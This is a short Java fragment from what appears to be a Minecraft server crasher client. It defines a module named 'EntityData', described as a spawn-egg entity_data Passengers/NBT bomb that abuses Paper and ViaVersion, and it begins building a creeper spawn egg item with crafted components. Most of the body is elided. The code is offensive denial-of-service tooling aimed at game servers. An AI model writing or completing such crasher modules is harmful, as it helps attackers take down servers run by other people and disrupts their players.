...
public class EntityDataCrash extends Module {
	private ScheduledExecutorService executorService;

	public EntityDataCrash() {
		super("EntityData", "Spawn-egg entity_data Passengers/NBT bomb (Paper / Via Abuser)", ModuleType.CRASHER);
	...
	public void executeModule(ModuleContext context) {
		...
		ItemStack stack = new ItemStack(ItemType.CREEPER_SPAWN_EGG.getId(protocol), 1, components);
